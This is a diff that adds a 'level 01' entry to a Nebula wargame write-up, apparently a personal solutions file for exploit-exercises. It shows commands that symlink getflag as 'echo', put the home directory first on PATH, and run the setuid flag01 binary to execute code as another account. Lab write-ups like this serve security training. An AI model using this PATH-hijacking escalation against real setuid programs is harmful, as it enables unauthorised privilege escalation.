@@ -5,6 +5,17 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 01
+--------
+
+##### use a sym link and PATH to overload echo and execute getflag via suid flag01 binary
+```bash
+level01@nebula:~$ ln -sf /bin/getflag echo
+level01@nebula:~$ PATH=$HOME:$PATH; /home/flag01/flag01 
+You have successfully executed getflag on a target account
+```
+
+
 level 02
 --------
 
